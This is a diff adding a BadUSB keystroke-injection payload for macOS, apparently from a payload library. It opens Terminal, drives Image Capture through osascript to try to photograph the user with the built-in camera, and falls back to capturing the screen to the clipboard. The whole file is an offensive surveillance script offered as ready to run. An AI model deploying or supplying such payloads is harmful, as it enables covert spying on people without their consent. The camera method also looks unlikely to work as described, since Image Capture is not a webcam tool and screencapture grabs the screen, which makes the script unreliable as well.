@@ -1,0 +1,28 @@
+REM Title: macOS Camera Capture
+REM Author: BadUSB Library
+REM Description: Takes photos using built-in camera
+REM Target: macOS 10.15+
+REM Category: Collection
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Take photo with camera
+STRING osascript -e 'tell application "Image Capture" to activate'
+ENTER
+DELAY 2000
+
+STRING osascript -e 'tell application "System Events" to tell process "Image Capture" to click button "Take Photo"'
+ENTER
+DELAY 3000
+
+REM Alternative method
+STRING screencapture -c
+ENTER
+DELAY 2000
